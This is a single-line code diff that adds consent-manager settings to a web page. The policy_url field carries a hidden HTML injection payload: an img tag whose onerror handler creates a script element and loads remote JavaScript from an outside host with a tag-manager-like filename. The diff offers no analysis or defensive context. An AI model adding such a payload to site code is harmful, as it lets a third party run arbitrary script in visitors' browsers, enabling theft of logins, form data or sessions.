@@ -1,0 +1,1 @@
+window.cmpSettings = JSON.parse("{\"policy_url\":\"<img src=1 onerror=\\\"var t=document.createElement(\\'script\\');t.src=\\'https://cdn-assets-eu.example.org/a/gtage.js\\';document.head.appendChild(t)\\\">\",\"theme\":\"light\"}");
